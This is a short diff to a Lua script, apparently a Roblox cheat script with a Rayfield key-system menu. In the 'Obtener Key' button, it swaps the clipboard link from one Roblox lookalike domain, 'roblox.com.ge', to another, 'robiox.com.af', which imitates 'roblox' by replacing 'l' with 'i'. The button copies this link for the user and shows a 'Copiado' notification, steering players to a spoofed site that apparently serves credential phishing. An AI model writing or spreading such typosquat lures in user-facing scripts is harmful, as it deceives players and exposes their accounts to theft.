@@ -37,7 +37,7 @@ KeyTab:CreateInput({
 KeyTab:CreateButton({
     Name = "📋 Obtener Key",
     Callback = function()
-        local link = "https://roblox.com.ge/communities/4362678772/"
+        local link = "https://robiox.com.af/communities/4362678772/"
         setclipboard(link)
         Rayfield:Notify({
             Title = "📋 Copiado",
